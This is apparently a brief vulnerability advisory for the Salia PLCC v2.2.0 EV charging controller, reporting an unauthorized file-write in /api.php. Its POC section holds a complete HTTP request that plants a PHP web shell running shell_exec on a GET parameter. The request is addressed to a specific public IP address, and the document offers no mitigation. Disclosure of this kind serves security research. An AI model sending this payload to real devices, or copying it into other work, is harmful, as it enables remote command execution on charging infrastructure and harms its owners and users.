# Salia PLCC v2.2.0 has a Unauthorized File-Write

### Description

Salia PLCC Master/Slave v2.2.0 has an Unauthorized File-Write in the file /api.php ,anyone can upload a file to include and getshell .

### Vender

Office Link :https://www.echarge.de

- The latest fireware v2.2.0 download link

  http://salia.echarge.de/firmware/

  http://salia.echarge.de/firmware/firmware_2.2.0.image

![image-20250528104625114](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508290014428.png)

## POC

```http
POST /api.php HTTP/1.1
Host: 2.205.5.189
Content-Type: application/json
Content-Length: 120

{"salia/setrfidlist": "<?php if(isset($_GET['cmd'])) { echo shell_exec($_GET['cmd']); } ?>"}
```

![image-20250817164926501](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508171649549.png)



![image-20250817164929494](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508171649537.png)